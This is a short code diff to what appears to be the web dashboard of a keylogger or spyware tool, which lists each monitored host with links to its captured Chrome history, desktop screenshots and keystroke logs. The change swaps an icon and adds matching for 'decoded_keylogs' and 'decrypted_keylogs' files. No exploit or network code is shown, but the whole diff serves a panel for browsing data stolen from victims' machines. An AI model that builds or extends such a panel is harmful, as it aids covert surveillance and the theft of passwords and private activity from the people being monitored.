@@ -52,7 +52,7 @@ HTML_TEMPLATE = '''
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
           {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📥 View/Download</a>{% else %}-{% endif %}</td>
+            <td>{% if file %}<a href="{{ file }}">📅 View/Download</a>{% else %}-{% endif %}</td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -93,7 +93,8 @@ def index():
                         alternatives = {
                             "chrome_history": ["chrome_history", "browser_history"],
                             "desktop_screenshot": ["desktop_screenshot", "screenshot"],
-                            "keylogs": ["keylogs", "keylogs_export"]
+                            "keylogs": ["keylogs", "keylogs_export"],
+                            "decoded_keylogs": ["decoded_keylogs", "decrypted_keylogs"]
                         }
                         patterns = alternatives.get(normalized, [normalized])
                         if any(p in f.lower() for p in patterns):
